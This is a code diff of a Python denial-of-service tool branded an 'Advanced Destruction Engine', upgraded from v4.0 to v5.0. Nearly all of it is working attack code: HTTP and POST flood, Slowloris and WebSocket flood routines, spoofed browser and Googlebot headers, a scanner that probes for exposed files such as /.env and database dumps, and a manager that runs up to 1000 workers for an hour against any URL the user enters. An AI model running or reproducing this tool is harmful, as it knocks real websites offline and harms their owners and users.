@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
 """
-╔══════════════════════════════════════════════════════════════╗
-║                    IRFAN'S DESTRUCTION TOOL v4.0             ║
-║                    Advanced Attack System                    ║
-╚══════════════════════════════════════════════════════════════╝
+██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗ 
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗
+██████╔╝██████╔╝███████║██║     █████╔╝ ███████║██████╔╝
+██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗
+██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+                ADVANCED DESTRUCTION ENGINE v5.0
 """
 
 import os
@@ -14,534 +17,812 @@ import threading
 import socket
 import asyncio
 import aiohttp
+import ssl
 import urllib.parse
+import json
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Rich imports
 from rich.console import Console
 from rich.panel import Panel
 from rich.text import Text
 from rich.table import Table
 from rich.live import Live
-from rich.progress import Progress, BarColumn, TextColumn
-from rich import box
-from rich.columns import Columns
 from rich.layout import Layout
+from rich.columns import Columns
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
+from rich.status import Status
+from rich.syntax import Syntax
+from rich import box
 import colorama
-from datetime import datetime
 
 # Initialize
 colorama.init(autoreset=True)
 console = Console()
 
-# ==================== GLOBAL VARIABLES ====================
-MAX_THREADS = 500
-MAX_RPS = 5000
-ATTACKING = False
-STATS = {'req': 0, 'success': 0, 'block': 0, 'error': 0, 'rps': 0, 'bytes': 0}
-LOCK = threading.Lock()
-START_TIME = 0
-LAST_COUNT = 0
-TARGET = ""
-PROTOCOL = "http"
-HOST = ""
-PORT = 80
-PATH = "/"
-ATTACK_MODE = "http"
-TOR_AVAILABLE = False
+# ==================== GLOBAL CONFIGURATION ====================
+class Config:
+    # Performance
+    MAX_THREADS = 1000
+    MAX_RPS = 10000
+    CONNECTION_TIMEOUT = 10
+    REQUEST_TIMEOUT = 15
+    
+    # Attack
+    ATTACK_DURATION = 3600  # 1 hour
+    AUTO_RESTART = True
+    STEALTH_MODE = False
+    
+    # Network
+    USE_PROXY = False
+    PROXY_LIST = []
+    ROTATE_USER_AGENT = True
+    ROTATE_IP = False
+    
+    # Monitoring
+    LOG_LEVEL = "INFO"
+    SAVE_STATS = True
+    
+    @classmethod
+    def update(cls, **kwargs):
+        for key, value in kwargs.items():
+            if hasattr(cls, key):
+                setattr(cls, key, value)
 
-# Headers for bypass
-BYPASS_HEADERS = [
-    {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Cache-Control': 'max-age=0'
-    },
-    {
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
-        'X-Requested-With': 'XMLHttpRequest'
-    },
-    {
-        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
-        'From': 'googlebot(at)googlebot.com'
+# Global state
+class AttackState:
+    attacking = False
+    start_time = 0
+    stats = {
+        'total_requests': 0,
+        'successful': 0,
+        'blocked': 0,
+        'errors': 0,
+        'bytes_sent': 0,
+        'bytes_received': 0,
+        'peak_rps': 0,
+        'current_rps': 0,
+        'targets_hit': 0,
+        'unique_ips': set()
     }
-]
+    lock = threading.Lock()
+    last_count = 0
 
-# Attack paths
-ATTACK_PATHS = [
-    '/', '/index.php', '/home', '/main', '/default',
-    '/wp-admin/', '/wp-login.php', '/wp-content/', '/wp-includes/',
-    '/admin/', '/administrator/', '/login', '/signin',
-    '/api/', '/api/v1/', '/api/v2/', '/graphql',
-    '/user/', '/dashboard/', '/panel/', '/cp/',
-    '/config/', '/configuration/', '/settings/',
-    '/test/', '/debug/', '/phpinfo.php', '/info.php',
-    '/.env', '/config.php', '/database.php', '/db.php',
-    '/backup/', '/backup.zip', '/backup.sql',
-    '/xmlrpc.php', '/wp-json/', '/rest-api/',
-    '/server-status', '/status', '/health',
-    '/images/', '/css/', '/js/', '/assets/',
-    '/robots.txt', '/sitemap.xml', '/.git/HEAD'
-]
-
-# ==================== BANNER ====================
-def show_banner():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    
-    banner = """
-    ███████╗██╗  ██╗██████╗  █████╗ ███╗   ██╗    ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗
-    ██╔════╝██║  ██║██╔══██╗██╔══██╗████╗  ██║    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝
-    ███████╗███████║██████╔╝███████║██╔██╗ ██║    ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ 
-    ╚════██║██╔══██║██╔══██╗██╔══██║██║╚██╗██║    ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  
-    ███████║██║  ██║██║  ██║██║  ██║██║ ╚████║    ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   
-    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   
-    
-    ════════════════════════════════════════════════════════════════════════════════════════════════════════
-                            VERSION 4.0 | BY IRFAN | ADVANCED AUTONOMOUS MODE
-    ════════════════════════════════════════════════════════════════════════════════════════════════════════
-    """
-    
-    console.print(Panel.fit(banner, 
-                          border_style="bold red", 
-                          padding=(1, 2),
-                          title="[bold yellow]🔥 IRFAN'S DESTRUCTION ENGINE 🔥[/]"))
-
-# ==================== TARGET PARSER ====================
-def parse_target(target):
-    global PROTOCOL, HOST, PORT, PATH
-    try:
-        if not target:
-            return False
-            
-        # Add protocol if missing
-        if not target.startswith(('http://', 'https://')):
-            target = 'http://' + target
+# Target information
+class TargetInfo:
+    def __init__(self, url):
+        self.url = url
+        self.protocol = "http"
+        self.host = ""
+        self.port = 80
+        self.path = "/"
+        self.ip = ""
+        self.ssl_enabled = False
+        self.server_info = {}
+        self.technologies = []
+        self.vulnerabilities = []
         
-        # Parse URL
-        parsed = urllib.parse.urlparse(target)
-        PROTOCOL = parsed.scheme
-        HOST = parsed.hostname
-        
-        if not HOST:
-            console.print("[red]✗ Invalid target URL![/]")
-            return False
-        
-        # Set port
-        if parsed.port:
-            PORT = parsed.port
-        else:
-            PORT = 443 if PROTOCOL == 'https' else 80
-        
-        # Set path
-        PATH = parsed.path or '/'
-        
-        # Show parsed info
-        console.print(f"\n[green]✅ Target successfully parsed![/]")
-        console.print(f"[cyan]🔗 Full URL:[/] {PROTOCOL}://{HOST}:{PORT}{PATH}")
-        console.print(f"[cyan]🌐 Protocol:[/] {PROTOCOL.upper()}")
-        console.print(f"[cyan]🎯 Host:[/] {HOST}")
-        console.print(f"[cyan]🚪 Port:[/] {PORT}")
-        console.print(f"[cyan]📁 Path:[/] {PATH}")
-        
-        return True
-        
-    except Exception as e:
-        console.print(f"[red]✗ Error parsing target: {e}[/]")
-        return False
-
-# ==================== TARGET INPUT ====================
-def get_target():
-    """Get target URL from user with examples"""
-    
-    # Show examples
-    examples_panel = Panel.fit(
-        "[bold cyan]📋 EXAMPLE TARGET FORMATS:[/]\n\n"
-        "[yellow]1. Full URL:[/] https://example.com\n"
-        "[yellow]2. With path:[/] http://test.com/admin\n"
-        "[yellow]3. Just domain:[/] example.org\n"
-        "[yellow]4. With port:[/] http://localhost:8080\n"
-        "[yellow]5. IP address:[/] http://192.168.1.1\n\n"
-        "[green]💡 Tip:[/] You can use any of these formats!",
-        border_style="bold blue",
-        padding=(1, 2)
-    )
-    
-    console.print(examples_panel)
-    
-    # Get target
-    console.print("\n[bold yellow]🎯 ENTER TARGET URL[/]")
-    console.print("[cyan]Enter the website URL you want to test:[/]")
-    
-    target = input("\n👉 Target URL: ").strip()
-    
-    if not target:
-        console.print("[red]✗ No target provided! Please enter a valid URL.[/]")
-        return None
-    
-    return target
-
-# ==================== CONFIGURATION MENU ====================
-def configuration_menu():
-    """Show configuration options"""
-    
-    config_panel = Panel.fit(
-        "[bold cyan]⚙️  ATTACK CONFIGURATION[/]\n\n"
-        f"[yellow]Current Settings:[/]\n"
-        f"• Threads: [green]{MAX_THREADS}[/]\n"
-        f"• RPS Limit: [green]{MAX_RPS}[/]\n"
-        f"• Attack Mode: [green]{ATTACK_MODE.upper()}[/]\n\n"
-        "[cyan]Press Enter to use defaults, or configure:[/]",
-        border_style="bold yellow",
-        padding=(1, 2)
-    )
-    
-    console.print(config_panel)
-    
-    # Threads configuration
-    threads_input = input(f"Threads [{MAX_THREADS}]: ").strip()
-    if threads_input.isdigit():
-        global MAX_THREADS
-        MAX_THREADS = int(threads_input)
-        console.print(f"[green]✓ Threads set to: {MAX_THREADS}[/]")
-    
-    # RPS configuration
-    rps_input = input(f"RPS Limit [{MAX_RPS}]: ").strip()
-    if rps_input.isdigit():
-        global MAX_RPS
-        MAX_RPS = int(rps_input)
-        console.print(f"[green]✓ RPS limit set to: {MAX_RPS}[/]")
-    
-    # Attack mode
-    console.print("\n[cyan]🎯 SELECT ATTACK MODE:[/]")
-    console.print("[yellow]1.[/] HTTP Flood (Default)")
-    console.print("[yellow]2.[/] Slowloris")
-    console.print("[yellow]3.[/] Multi-Vector")
-    
-    mode_input = input("\nSelect mode [1-3]: ").strip()
-    global ATTACK_MODE
-    
-    if mode_input == '2':
-        ATTACK_MODE = "slowloris"
-        console.print("[green]✓ Attack mode: SLOWLORIS[/]")
-    elif mode_input == '3':
-        ATTACK_MODE = "multi"
-        console.print("[green]✓ Attack mode: MULTI-VECTOR[/]")
-    else:
-        ATTACK_MODE = "http"
-        console.print("[green]✓ Attack mode: HTTP FLOOD[/]")
-
-# ==================== ASYNC ATTACK WORKER ====================
-class AsyncAttacker:
-    def __init__(self):
-        self.session = None
-        self.success = 0
-        self.errors = 0
-    
-    async def create_session(self):
-        """Create async HTTP session"""
-        timeout = aiohttp.ClientTimeout(total=10)
-        connector = aiohttp.TCPConnector(limit=0, ssl=False)
-        headers = random.choice(BYPASS_HEADERS)
-        
-        self.session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=timeout,
-            headers=headers
-        )
-    
-    async def send_request(self):
-        """Send single attack request"""
+    def parse(self):
+        """Parse target URL"""
         try:
-            if not self.session:
-                await self.create_session()
+            if not self.url.startswith(('http://', 'https://')):
+                self.url = 'http://' + self.url
             
-            # Random path selection with parameters
-            path = random.choice(ATTACK_PATHS)
+            parsed = urllib.parse.urlparse(self.url)
+            self.protocol = parsed.scheme
+            self.host = parsed.hostname
+            self.port = parsed.port or (443 if self.protocol == 'https' else 80)
+            self.path = parsed.path or '/'
+            self.ssl_enabled = (self.protocol == 'https')
+            
+            # Get IP address
+            try:
+                self.ip = socket.gethostbyname(self.host)
+                AttackState.stats['unique_ips'].add(self.ip)
+            except:
+                self.ip = self.host
+            
+            return True
+        except Exception as e:
+            console.print(f"[red]✗ Error parsing target: {e}[/]")
+            return False
+    
+    def scan(self):
+        """Scan target for information"""
+        try:
+            # Get server headers
+            response = requests.get(self.url, timeout=5, verify=False)
+            self.server_info = dict(response.headers)
+            
+            # Detect technologies
+            self._detect_technologies(response)
+            
+            # Find vulnerabilities
+            self._find_vulnerabilities()
+            
+            return True
+        except:
+            return False
+    
+    def _detect_technologies(self, response):
+        """Detect web technologies"""
+        tech_indicators = {
+            'WordPress': ['/wp-content/', '/wp-admin/', 'wp-json'],
+            'Joomla': ['/media/jui/', '/administrator/', 'joomla'],
+            'Drupal': ['/sites/default/', 'Drupal'],
+            'Laravel': ['/storage/', 'laravel_session'],
+            'Nginx': ['Server: nginx'],
+            'Apache': ['Server: Apache'],
+            'CloudFlare': ['cf-ray', 'cloudflare'],
+            'PHP': ['PHP/', 'X-Powered-By: PHP']
+        }
+        
+        content = response.text.lower()
+        headers = str(response.headers).lower()
+        
+        for tech, indicators in tech_indicators.items():
+            for indicator in indicators:
+                if indicator.lower() in content or indicator.lower() in headers:
+                    self.technologies.append(tech)
+                    break
+    
+    def _find_vulnerabilities(self):
+        """Find common vulnerabilities"""
+        vuln_endpoints = [
+            '/xmlrpc.php',
+            '/wp-json/wp/v2/users',
+            '/.env',
+            '/phpinfo.php',
+            '/server-status',
+            '/admin/config.php',
+            '/debug',
+            '/test',
+            '/backup',
+            '/database.sql'
+        ]
+        
+        for endpoint in vuln_endpoints:
+            try:
+                test_url = f"{self.url.rstrip('/')}{endpoint}"
+                resp = requests.get(test_url, timeout=2, verify=False)
+                if resp.status_code in [200, 403, 500]:
+                    self.vulnerabilities.append(endpoint)
+            except:
+                continue
+
+# ==================== ADVANCED ATTACK VECTORS ====================
+class AttackVectors:
+    """Advanced attack vectors"""
+    
+    @staticmethod
+    async def http_flood(target, session):
+        """HTTP flood attack"""
+        try:
+            # Random path and parameters
+            paths = ['/', '/index.php', '/wp-admin/', '/api/', '/admin/']
+            path = random.choice(paths)
             
             # Add random parameters
-            params = ""
-            if random.random() > 0.3:
-                params = f"?_={random.randint(10000, 99999)}"
-                if random.random() > 0.5:
-                    params += f"&cache={random.randint(1, 1000)}"
+            params = f"?_={random.randint(10000, 99999)}"
+            if random.random() > 0.5:
+                params += f"&cache={random.randint(1, 1000)}"
             
-            # Build URL
-            if PORT in [80, 443]:
-                url = f"{PROTOCOL}://{HOST}{path}{params}"
-            else:
-                url = f"{PROTOCOL}://{HOST}:{PORT}{path}{params}"
+            url = f"{target.protocol}://{target.host}:{target.port}{path}{params}"
             
-            # Send request
-            async with self.session.get(url, ssl=False) as response:
+            # Random headers
+            headers = {
+                'User-Agent': random.choice(USER_AGENTS),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache'
+            }
+            
+            # Add referer
+            if random.random() > 0.7:
+                headers['Referer'] = f"https://www.google.com/search?q={target.host}"
+            
+            async with session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                 data = await response.read()
                 
-                with LOCK:
-                    STATS['bytes'] += len(data)
+                with AttackState.lock:
+                    AttackState.stats['bytes_sent'] += len(str(headers)) + len(url)
+                    AttackState.stats['bytes_received'] += len(data)
                 
-                # Check response
                 if 200 <= response.status < 400:
                     return 'success'
                 elif response.status in [403, 429, 503]:
-                    return 'block'
+                    return 'blocked'
                 else:
                     return 'success'
                     
-        except aiohttp.ClientError:
-            return 'error'
-        except Exception:
+        except Exception as e:
             return 'error'
     
-    async def attack_loop(self):
-        """Main attack loop"""
-        while ATTACKING:
-            result = await self.send_request()
+    @staticmethod
+    async def slowloris(target, session):
+        """Slowloris attack"""
+        try:
+            # Create partial request
+            request = f"GET {target.path} HTTP/1.1\r\n"
+            request += f"Host: {target.host}\r\n"
+            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+            request += "Accept-Language: en-US,en;q=0.5\r\n"
+            request += "Accept-Encoding: gzip, deflate\r\n"
+            request += "Connection: keep-alive\r\n"
+            request += "Keep-Alive: timeout=900\r\n"
             
-            with LOCK:
-                STATS['req'] += 1
-                if result == 'success':
-                    STATS['success'] += 1
-                elif result == 'block':
-                    STATS['block'] += 1
-                else:
-                    STATS['error'] += 1
+            # Send partial headers
+            reader, writer = await asyncio.open_connection(target.host, target.port, ssl=target.ssl_enabled)
+            writer.write(request.encode())
+            await writer.drain()
             
-            # Rate limiting
-            if MAX_RPS > 0:
-                await asyncio.sleep(1.0 / MAX_RPS)
-
-# ==================== STATS DISPLAY ====================
-def display_stats():
-    """Display real-time statistics"""
-    global LAST_COUNT
+            # Keep connection alive
+            for _ in range(10):
+                await asyncio.sleep(random.uniform(10, 30))
+                writer.write(b"X-a: b\r\n")
+                await writer.drain()
+            
+            writer.close()
+            await writer.wait_closed()
+            
+            with AttackState.lock:
+                AttackState.stats['bytes_sent'] += len(request)
+            
+            return 'success'
+            
+        except:
+            return 'error'
     
-    with Live(refresh_per_second=4, screen=False) as live:
-        while ATTACKING:
-            time.sleep(0.25)
+    @staticmethod
+    async def post_flood(target, session):
+        """POST request flood"""
+        try:
+            url = f"{target.protocol}://{target.host}:{target.port}{target.path}"
             
-            with LOCK:
-                total = STATS['req']
-                elapsed = time.time() - START_TIME
-                current_rps = (total - LAST_COUNT) / 0.25 if elapsed > 0 else 0
-                LAST_COUNT = total
-                STATS['rps'] = max(STATS['rps'], current_rps)
+            # Random POST data
+            post_data = {
+                'username': f'user{random.randint(1, 10000)}',
+                'password': f'pass{random.randint(1, 10000)}',
+                'email': f'email{random.randint(1, 10000)}@test.com',
+                'submit': 'Submit'
+            }
+            
+            # Add random fields
+            for i in range(random.randint(1, 5)):
+                post_data[f'field{i}'] = f'value{random.randint(1, 1000)}'
+            
+            headers = {
+                'User-Agent': random.choice(USER_AGENTS),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Accept': '*/*',
+                'Connection': 'keep-alive'
+            }
+            
+            async with session.post(url, data=post_data, headers=headers, ssl=False, 
+                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
+                data = await response.read()
                 
-                # Calculate MB/s
-                mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+                with AttackState.lock:
+                    AttackState.stats['bytes_sent'] += len(str(post_data)) + len(str(headers))
+                    AttackState.stats['bytes_received'] += len(data)
+                
+                return 'success' if response.status < 500 else 'error'
+                
+        except:
+            return 'error'
+    
+    @staticmethod
+    async def websocket_flood(target, session):
+        """WebSocket connection flood"""
+        try:
+            ws_url = f"ws://{target.host}:{target.port}/ws" if target.protocol == 'http' else f"wss://{target.host}:{target.port}/ws"
             
-            success_rate = (STATS['success'] / max(total, 1)) * 100
-            
-            # Create table
-            table = Table(title=f"🚀 LIVE ATTACK IN PROGRESS | {ATTACK_MODE.upper()} MODE", 
-                         box=box.DOUBLE_EDGE, 
-                         title_style="bold magenta",
-                         header_style="bold cyan")
-            
-            table.add_column("METRIC", style="yellow", width=18)
-            table.add_column("VALUE", style="green", width=15)
-            table.add_column("STATUS", style="magenta", width=22)
-            
-            table.add_row("🎯 TARGET", f"{HOST}", f"Port: {PORT}")
-            table.add_row("⚡ LIVE RPS", f"{int(current_rps):,}", f"Limit: {MAX_RPS:,}")
-            table.add_row("📊 BANDWIDTH", f"{mbps:.1f} MB/s", "")
-            table.add_row("📨 TOTAL REQ", f"{total:,}", "")
-            table.add_row("✅ SUCCESS", f"{STATS['success']:,}", f"Rate: {success_rate:.1f}%")
-            table.add_row("🚫 BLOCKED", f"{STATS['block']:,}", "")
-            table.add_row("❌ ERRORS", f"{STATS['error']:,}", "")
-            table.add_row("💾 BYTES SENT", f"{STATS['bytes']/1024/1024:.1f} MB", "")
-            table.add_row("⏱️  UPTIME", f"{int(elapsed)}s", f"Peak: {int(STATS['rps']):,} RPS")
-            table.add_row("🔧 MODE", f"{ATTACK_MODE.upper()}", "")
-            
-            live.update(table)
+            try:
+                async with session.ws_connect(ws_url, timeout=5) as ws:
+                    # Send random data
+                    for _ in range(random.randint(1, 10)):
+                        await ws.send_str(json.dumps({'data': random.randint(1, 10000)}))
+                        await asyncio.sleep(0.1)
+                    
+                    await ws.close()
+                    return 'success'
+            except:
+                # Try different WebSocket endpoints
+                endpoints = ['/socket.io/', '/ws', '/websocket', '/wss']
+                for endpoint in endpoints:
+                    try:
+                        ws_url = f"ws://{target.host}:{target.port}{endpoint}" if target.protocol == 'http' else f"wss://{target.host}:{target.port}{endpoint}"
+                        async with session.ws_connect(ws_url, timeout=2) as ws:
+                            await ws.close()
+                            return 'success'
+                    except:
+                        continue
+                
+                return 'error'
+        except:
+            return 'error'
 
-# ==================== ATTACK LAUNCHER ====================
-def launch_attack():
-    """Launch the main attack"""
-    global ATTACKING, START_TIME
+# ==================== ATTACK MANAGER ====================
+class AttackManager:
+    """Manage attack execution"""
     
-    # Show attack summary
-    summary = Panel.fit(
-        f"[bold red]💀 ATTACK SUMMARY[/]\n\n"
-        f"[cyan]Target:[/] {PROTOCOL}://{HOST}:{PORT}{PATH}\n"
-        f"[cyan]Threads:[/] {MAX_THREADS}\n"
-        f"[cyan]RPS Limit:[/] {MAX_RPS}\n"
-        f"[cyan]Mode:[/] {ATTACK_MODE.upper()}\n\n"
-        f"[yellow]Press Ctrl+C to stop the attack[/]",
-        border_style="bold red",
-        padding=(1, 2)
-    )
+    def __init__(self, target):
+        self.target = target
+        self.workers = []
+        self.session = None
+        self.attack_methods = [
+            AttackVectors.http_flood,
+            AttackVectors.post_flood,
+            AttackVectors.slowloris,
+            AttackVectors.websocket_flood
+        ]
     
-    console.print(summary)
-    
-    # Countdown
-    console.print("[yellow]🚀 Launching attack in:[/]")
-    for i in range(3, 0, -1):
-        console.print(f"[red]{i}...[/]")
-        time.sleep(1)
-    
-    # Start attack
-    ATTACKING = True
-    START_TIME = time.time()
-    
-    # Start stats display in separate thread
-    stats_thread = threading.Thread(target=display_stats, daemon=True)
-    stats_thread.start()
-    
-    # Start async attack
-    async def start_async_attack():
-        # Create workers (limit to reasonable number)
-        worker_count = min(MAX_THREADS, 300)  # Max 300 workers for stability
-        workers = [AsyncAttacker() for _ in range(worker_count)]
+    async def init_session(self):
+        """Initialize aiohttp session"""
+        timeout = aiohttp.ClientTimeout(total=Config.REQUEST_TIMEOUT)
+        connector = aiohttp.TCPConnector(
+            limit=0,
+            ssl=False,
+            force_close=True,
+            enable_cleanup_closed=True
+        )
         
-        # Start attack loops
-        tasks = [worker.attack_loop() for worker in workers]
-        await asyncio.gather(*tasks)
+        self.session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=timeout
+        )
     
-    # Run attack
-    try:
-        asyncio.run(start_async_attack())
-    except KeyboardInterrupt:
-        stop_attack()
-    except Exception as e:
-        console.print(f"[red]✗ Attack error: {e}[/]")
-        stop_attack()
+    async def worker(self, worker_id):
+        """Attack worker"""
+        while AttackState.attacking:
+            try:
+                # Select random attack method
+                attack_method = random.choice(self.attack_methods)
+                
+                # Execute attack
+                result = await attack_method(self.target, self.session)
+                
+                # Update stats
+                with AttackState.lock:
+                    AttackState.stats['total_requests'] += 1
+                    
+                    if result == 'success':
+                        AttackState.stats['successful'] += 1
+                    elif result == 'blocked':
+                        AttackState.stats['blocked'] += 1
+                    else:
+                        AttackState.stats['errors'] += 1
+                
+                # Rate limiting
+                if Config.MAX_RPS > 0:
+                    await asyncio.sleep(1.0 / Config.MAX_RPS)
+                    
+            except Exception as e:
+                with AttackState.lock:
+                    AttackState.stats['errors'] += 1
+    
+    async def start(self, num_workers):
+        """Start attack"""
+        await self.init_session()
+        
+        # Create workers
+        tasks = []
+        for i in range(min(num_workers, Config.MAX_THREADS)):
+            task = asyncio.create_task(self.worker(i))
+            tasks.append(task)
+        
+        # Wait for attack duration or stop signal
+        try:
+            start_time = time.time()
+            while AttackState.attacking and (time.time() - start_time) < Config.ATTACK_DURATION:
+                await asyncio.sleep(1)
+        finally:
+            # Cancel all tasks
+            for task in tasks:
+                task.cancel()
+            
+            # Close session
+            if self.session:
+                await self.session.close()
 
-# ==================== STOP ATTACK ====================
-def stop_attack():
-    """Stop the attack and show report"""
-    global ATTACKING
+# ==================== MONITORING & DISPLAY ====================
+class AttackMonitor:
+    """Monitor and display attack statistics"""
     
-    ATTACKING = False
-    console.print("\n[yellow]⚠️  Stopping attack... Please wait[/]")
-    time.sleep(2)
+    @staticmethod
+    def calculate_stats():
+        """Calculate current statistics"""
+        with AttackState.lock:
+            total = AttackState.stats['total_requests']
+            elapsed = time.time() - AttackState.start_time
+            
+            # Calculate RPS
+            current_rps = (total - AttackState.last_count) / 1.0 if elapsed > 0 else 0
+            AttackState.stats['current_rps'] = current_rps
+            AttackState.stats['peak_rps'] = max(AttackState.stats['peak_rps'], current_rps)
+            AttackState.last_count = total
+            
+            # Calculate bandwidth
+            mbps_sent = (AttackState.stats['bytes_sent'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+            mbps_recv = (AttackState.stats['bytes_received'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+            
+            # Success rate
+            success_rate = (AttackState.stats['successful'] / max(total, 1)) * 100
+            
+            return {
+                'total_requests': total,
+                'successful': AttackState.stats['successful'],
+                'blocked': AttackState.stats['blocked'],
+                'errors': AttackState.stats['errors'],
+                'current_rps': int(current_rps),
+                'peak_rps': int(AttackState.stats['peak_rps']),
+                'mbps_sent': mbps_sent,
+                'mbps_recv': mbps_recv,
+                'success_rate': success_rate,
+                'elapsed_time': int(elapsed),
+                'unique_ips': len(AttackState.stats['unique_ips']),
+                'bytes_sent_mb': AttackState.stats['bytes_sent'] / 1024 / 1024,
+                'bytes_recv_mb': AttackState.stats['bytes_received'] / 1024 / 1024
+            }
     
-    # Final report
-    total = STATS['req']
-    elapsed = time.time() - START_TIME
-    success_rate = (STATS['success'] / max(total, 1)) * 100
-    avg_rps = total / elapsed if elapsed > 0 else 0
-    mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+    @staticmethod
+    def display_dashboard():
+        """Display real-time dashboard"""
+        with Live(refresh_per_second=2, screen=True) as live:
+            while AttackState.attacking:
+                stats = AttackMonitor.calculate_stats()
+                
+                # Create layout
+                layout = Layout()
+                layout.split_column(
+                    Layout(name="header", size=3),
+                    Layout(name="main", ratio=2),
+                    Layout(name="footer", size=7)
+                )
+                
+                # Header
+                header = Panel(
+                    f"[bold red]⚡ ADVANCED DESTRUCTION ENGINE v5.0[/] | "
+                    f"[bold cyan]Target:[/] {AttackMonitor.current_target} | "
+                    f"[bold yellow]Mode:[/] MULTI-VECTOR | "
+                    f"[bold green]Status:[/] {'[green]ACTIVE[/]' if AttackState.attacking else '[red]STOPPED[/]'}",
+                    border_style="bold red"
+                )
+                layout["header"].update(header)
+                
+                # Main stats
+                main_table = Table(title="📊 LIVE ATTACK STATISTICS", box=box.ROUNDED, title_style="bold cyan")
+                main_table.add_column("METRIC", style="yellow", width=20)
+                main_table.add_column("VALUE", style="green", width=15)
+                main_table.add_column("STATUS", style="magenta", width=20)
+                
+                main_table.add_row("Total Requests", f"{stats['total_requests']:,}", "")
+                main_table.add_row("Current RPS", f"{stats['current_rps']:,}", f"Peak: {stats['peak_rps']:,}")
+                main_table.add_row("Success Rate", f"{stats['success_rate']:.1f}%", 
+                                 f"[green]✓ {stats['successful']:,}[/] | [yellow]🚫 {stats['blocked']:,}[/] | [red]✗ {stats['errors']:,}[/]")
+                main_table.add_row("Bandwidth", f"▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s", "")
+                main_table.add_row("Data Transferred", f"Sent: {stats['bytes_sent_mb']:.1f} MB | Recv: {stats['bytes_recv_mb']:.1f} MB", "")
+                main_table.add_row("Attack Duration", f"{stats['elapsed_time']}s", f"Max: {Config.ATTACK_DURATION}s")
+                main_table.add_row("Unique IPs", f"{stats['unique_ips']}", "")
+                main_table.add_row("Threads Active", f"{Config.MAX_THREADS}", f"RPS Limit: {Config.MAX_RPS:,}")
+                
+                layout["main"].update(Panel(main_table, border_style="bold blue"))
+                
+                # Footer - Progress bars
+                progress_text = Text()
+                progress_text.append(f"\n🎯 Target: {AttackMonitor.current_target}\n", style="bold cyan")
+                progress_text.append(f"⏱️  Elapsed: {stats['elapsed_time']}s | ", style="yellow")
+                progress_text.append(f"📨 Requests: {stats['total_requests']:,} | ", style="green")
+                progress_text.append(f"⚡ RPS: {stats['current_rps']:,}\n", style="red")
+                
+                # Progress bars
+                progress_table = Table(show_header=False, box=None)
+                progress_table.add_column(width=50)
+                
+                # Success rate bar
+                success_bar = "█" * int(stats['success_rate'] / 2) + "░" * (50 - int(stats['success_rate'] / 2))
+                progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
+                
+                # RPS progress
+                rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
+                rps_bar = "█" * int(rps_percent / 2) + "░" * (50 - int(rps_percent / 2))
+                progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
+                
+                layout["footer"].update(Panel(progress_table, title="📈 PROGRESS", border_style="bold green"))
+                
+                live.update(layout)
